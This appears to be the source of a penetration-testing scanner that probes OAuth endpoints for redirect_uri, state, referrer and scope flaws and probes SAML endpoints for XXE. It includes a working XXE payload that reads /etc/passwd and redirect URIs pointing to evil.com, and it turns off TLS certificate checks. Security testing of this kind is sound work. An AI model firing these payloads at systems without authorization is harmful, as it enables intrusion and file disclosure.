"""
Jarwis AGI Pen Test - OAuth/SAML Security Scanner
Detects OAuth and SAML vulnerabilities (A07:2021 - Identification and Authentication Failures)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import re
import json
from typing import Dict, List, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class OAuthVulnScanner:
    """
    Scans for OAuth 2.0 security vulnerabilities
    OWASP A07:2021 - Identification and Authentication Failures
    
    Attack vectors:
    - Open redirect in redirect_uri
    - State parameter bypass
    - Token leakage via referer
    - Implicit grant hijacking
    - Authorization code injection
    - PKCE bypass
    - Scope escalation
    """
    
    # Common OAuth endpoints
    OAUTH_ENDPOINTS = [
        '/oauth/authorize', '/oauth/auth', '/oauth2/authorize',
        '/oauth/token', '/oauth2/token', '/oauth/access_token',
        '/connect/authorize', '/connect/token',
        '/api/oauth/authorize', '/api/oauth/token',
        '/authorize', '/auth', '/login/oauth',
        '/.well-known/openid-configuration',
        '/.well-known/oauth-authorization-server',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        self.oauth_config: dict = {}
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting OAuth Security scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Discover OAuth endpoints
            await self._discover_oauth(session, base_url)
            
            # Test redirect_uri manipulation
            await self._test_redirect_uri(session, base_url)
            
            # Test state parameter
            await self._test_state_parameter(session, base_url)
            
            # Test token leakage
            await self._test_token_leakage(session, base_url)
            
            # Test scope escalation
            await self._test_scope_escalation(session, base_url)
        
        logger.info(f"OAuth scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _discover_oauth(self, session: aiohttp.ClientSession, base_url: str):
        """Discover OAuth configuration and endpoints"""
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        # Check OpenID Connect discovery
        discovery_urls = [
            urljoin(base_url, '/.well-known/openid-configuration'),
            urljoin(base_url, '/.well-known/oauth-authorization-server'),
        ]
        
        for url in discovery_urls:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                async with session.get(url, headers=headers) as response:
                    if response.status == 200:
                        try:
                            self.oauth_config = await response.json()
                            logger.info(f"Found OAuth config at {url}")
                            
                            # Check for weak configuration
                            await self._analyze_config(url)
                            return
                        except json.JSONDecodeError:
                            pass
                            
            except Exception as e:
                logger.debug(f"OAuth discovery error: {e}")
    
    async def _analyze_config(self, url: str):
        """Analyze OAuth configuration for weaknesses"""
        if not self.oauth_config:
            return
        
        # Check for dangerous response types
        response_types = self.oauth_config.get('response_types_supported', [])
        if 'token' in response_types:
            result = ScanResult(
                id=f"OAUTH-IMPLICIT-{len(self.results)+1}",
                category="A07:2021 - Auth Failures",
                severity="medium",
                title="OAuth Implicit Grant Supported",
                description="OAuth server supports implicit grant (token in URL), which is deprecated.",
                url=url,
                method="GET",
                evidence=f"response_types_supported: {response_types}",
                remediation="Disable implicit grant. Use authorization code with PKCE instead.",
                cwe_id="CWE-287",
                reasoning="Implicit grant exposes tokens in URL/history/referer"
            )
            self.results.append(result)
        
        # Check for PKCE support
        code_challenge_methods = self.oauth_config.get('code_challenge_methods_supported', [])
        if not code_challenge_methods or 'S256' not in code_challenge_methods:
            result = ScanResult(
                id=f"OAUTH-PKCE-{len(self.results)+1}",
                category="A07:2021 - Auth Failures",
                severity="medium",
                title="OAuth PKCE Not Supported",
                description="OAuth doesn't support PKCE (S256), vulnerable to code interception.",
                url=url,
                method="GET",
                evidence=f"code_challenge_methods_supported: {code_challenge_methods}",
                remediation="Implement PKCE with S256 method for all OAuth flows.",
                cwe_id="CWE-287",
                reasoning="Missing PKCE allows authorization code interception"
            )
            self.results.append(result)
    
    async def _test_redirect_uri(self, session: aiohttp.ClientSession, base_url: str):
        """Test for redirect_uri manipulation"""
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        auth_endpoint = self.oauth_config.get('authorization_endpoint')
        if not auth_endpoint:
            for endpoint in ['/oauth/authorize', '/oauth2/authorize', '/authorize']:
                auth_endpoint = urljoin(base_url, endpoint)
                try:
                    async with session.get(auth_endpoint, headers=headers) as response:
                        if response.status != 404:
                            break
                except Exception:
                    pass
        
        if not auth_endpoint:
            return
        
        parsed = urlparse(base_url)
        malicious_uris = [
            'https://evil.com/callback',
            f'https://{parsed.netloc}.evil.com/callback',
            f'{base_url}@evil.com',
            'http://localhost/callback',
        ]
        
        for malicious_uri in malicious_uris:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                test_url = f"{auth_endpoint}?response_type=code&client_id=test&redirect_uri={malicious_uri}"
                
                async with session.get(test_url, headers=headers, allow_redirects=False) as response:
                    location = response.headers.get('Location', '')
                    
                    if 'evil' in location or 'localhost' in location:
                        result = ScanResult(
                            id=f"OAUTH-REDIRECT-{len(self.results)+1}",
                            category="A07:2021 - Auth Failures",
                            severity="critical",
                            title="OAuth Redirect URI Manipulation",
                            description="OAuth redirect_uri can be manipulated to external domain.",
                            url=auth_endpoint,
                            method="GET",
                            parameter="redirect_uri",
                            evidence=f"Redirected to: {location}",
                            remediation="Strictly validate redirect_uri against registered whitelist.",
                            cwe_id="CWE-601",
                            poc=test_url,
                            reasoning="Malicious redirect_uri was accepted"
                        )
                        self.results.append(result)
                        return
                        
            except Exception as e:
                logger.debug(f"Redirect URI test error: {e}")
    
    async def _test_state_parameter(self, session: aiohttp.ClientSession, base_url: str):
        """Test for state parameter bypass"""
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        auth_endpoint = self.oauth_config.get('authorization_endpoint')
        if not auth_endpoint:
            auth_endpoint = urljoin(base_url, '/oauth/authorize')
        
        test_url = f"{auth_endpoint}?response_type=code&client_id=test&redirect_uri={base_url}/callback"
        
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            async with session.get(test_url, headers=headers, allow_redirects=False) as response:
                body = await response.text()
                
                if response.status in [200, 302] and 'state' not in body.lower():
                    result = ScanResult(
                        id=f"OAUTH-STATE-{len(self.results)+1}",
                        category="A07:2021 - Auth Failures",
                        severity="high",
                        title="OAuth Missing State Parameter",
                        description="OAuth flow works without state parameter, enabling CSRF attacks.",
                        url=auth_endpoint,
                        method="GET",
                        parameter="state",
                        evidence="Request processed without state parameter",
                        remediation="Require and validate state parameter.",
                        cwe_id="CWE-352",
                        poc=test_url,
                        reasoning="State parameter not required"
                    )
                    self.results.append(result)
                    
        except Exception as e:
            logger.debug(f"State parameter test error: {e}")
    
    async def _test_token_leakage(self, session: aiohttp.ClientSession, base_url: str):
        """Test for token leakage via referer"""
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        auth_endpoint = self.oauth_config.get('authorization_endpoint')
        if not auth_endpoint:
            return
        
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            async with session.get(auth_endpoint, headers=headers) as response:
                referrer_policy = response.headers.get('Referrer-Policy', '')
                
                if not referrer_policy or referrer_policy not in ['no-referrer', 'same-origin']:
                    result = ScanResult(
                        id=f"OAUTH-REFERER-{len(self.results)+1}",
                        category="A07:2021 - Auth Failures",
                        severity="medium",
                        title="OAuth Token Leakage via Referer",
                        description="OAuth endpoint doesn't set strict Referrer-Policy.",
                        url=auth_endpoint,
                        method="GET",
                        parameter="Referrer-Policy",
                        evidence=f"Referrer-Policy: {referrer_policy or 'not set'}",
                        remediation="Set Referrer-Policy: no-referrer on OAuth endpoints.",
                        cwe_id="CWE-200",
                        reasoning="Weak/missing Referrer-Policy on OAuth endpoint"
                    )
                    self.results.append(result)
                    
        except Exception as e:
            logger.debug(f"Token leakage test error: {e}")
    
    async def _test_scope_escalation(self, session: aiohttp.ClientSession, base_url: str):
        """Test for OAuth scope escalation"""
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        auth_endpoint = self.oauth_config.get('authorization_endpoint')
        if not auth_endpoint:
            auth_endpoint = urljoin(base_url, '/oauth/authorize')
        
        privileged_scopes = ['admin', 'root', 'all', '*', 'write:all']
        
        for scope in privileged_scopes:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                test_url = f"{auth_endpoint}?response_type=code&client_id=test&scope={scope}"
                
                async with session.get(test_url, headers=headers, allow_redirects=False) as response:
                    body = await response.text()
                    
                    if response.status in [200, 302] and 'invalid_scope' not in body.lower():
                        result = ScanResult(
                            id=f"OAUTH-SCOPE-{len(self.results)+1}",
                            category="A07:2021 - Auth Failures",
                            severity="high",
                            title="OAuth Scope Escalation Possible",
                            description=f"OAuth accepts elevated scope '{scope}'.",
                            url=auth_endpoint,
                            method="GET",
                            parameter="scope",
                            evidence=f"Scope '{scope}' was accepted",
                            remediation="Validate requested scopes against permissions.",
                            cwe_id="CWE-269",
                            poc=test_url,
                            reasoning="Privileged scope was not rejected"
                        )
                        self.results.append(result)
                        return
                        
            except Exception as e:
                logger.debug(f"Scope escalation test error: {e}")


class SAMLVulnScanner:
    """
    Scans for SAML security vulnerabilities
    OWASP A07:2021 - Identification and Authentication Failures
    """
    
    SAML_ENDPOINTS = [
        '/saml', '/saml2', '/sso', '/sso/saml', '/auth/saml',
        '/saml/login', '/saml/sso', '/saml/metadata',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting SAML Security scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            saml_endpoints = await self._discover_saml(session, base_url)
            
            for endpoint in saml_endpoints:
                await self._test_saml_xxe(session, endpoint)
        
        logger.info(f"SAML scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _discover_saml(self, session: aiohttp.ClientSession, base_url: str) -> List[str]:
        """Discover SAML endpoints"""
        headers = {'User-Agent': 'Mozilla/5.0'}
        found = []
        
        for endpoint in self.SAML_ENDPOINTS:
            url = urljoin(base_url, endpoint)
            try:
                await asyncio.sleep(1 / self.rate_limit)
                async with session.get(url, headers=headers) as response:
                    if response.status != 404:
                        found.append(url)
            except Exception:
                pass
        
        return found
    
    async def _test_saml_xxe(self, session: aiohttp.ClientSession, url: str):
        """Test for XXE in SAML processing"""
        headers = {'Content-Type': 'application/xml', 'User-Agent': 'Mozilla/5.0'}
        
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
</samlp:AuthnRequest>'''
        
        try:
            await asyncio.sleep(1 / self.rate_limit)
            async with session.post(url, data=xxe_payload, headers=headers) as response:
                body = await response.text()
                
                if 'root:' in body or 'daemon' in body:
                    result = ScanResult(
                        id=f"SAML-XXE-{len(self.results)+1}",
                        category="A03:2021 - Injection",
                        severity="critical",
                        title="SAML XXE Injection",
                        description="SAML processor vulnerable to XXE injection.",
                        url=url,
                        method="POST",
                        evidence=body[:300],
                        remediation="Disable external entities in XML parser.",
                        cwe_id="CWE-611",
                        poc=xxe_payload[:200],
                        reasoning="XXE payload returned file contents"
                    )
                    self.results.append(result)
                    
        except Exception as e:
            logger.debug(f"SAML XXE test error: {e}")
